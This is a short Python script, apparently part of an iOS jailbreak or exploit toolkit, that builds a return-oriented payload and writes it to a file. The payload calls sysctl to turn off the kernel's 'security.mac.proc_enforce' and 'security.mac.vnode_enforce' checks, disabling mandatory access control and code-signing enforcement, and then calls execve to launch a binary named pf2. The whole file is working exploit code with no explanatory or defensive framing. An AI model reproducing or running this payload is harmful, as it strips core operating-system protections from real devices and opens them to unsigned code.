#!/opt/local/bin/python2.6
import sys
import dmini
dmini.init(sys.argv[1:])
from world1 import *
from config import *

init('PC')
make_avail()

zero = ptrI(0)

name2oid_oid = ptrI(0, 3)
real_oid = ptrI(0, 0, 0)
oidlenp = ptrI(0)

def s(name):
    funcall('_syscall', 202, name2oid_oid, 8, real_oid, oidlenp, ptr(name, True), len(name))
    # the id might change, but the length won't- it's 3
    funcall('_syscall', 202, real_oid, 3, 0, 0, zero, 4)

s('security.mac.proc_enforce')
s('security.mac.vnode_enforce')
def e(name):
    p = ptr(name, True)
    funcall('_syscall', 59, p, ptrI(p, 0), zero)
e('./pf2')
e('/usr/lib/pf2')


final = finalize(0x11000000 - 4)
#(for debug)
#heapdump(cache)

open('just_sysctl_output.txt', 'w').write(final)
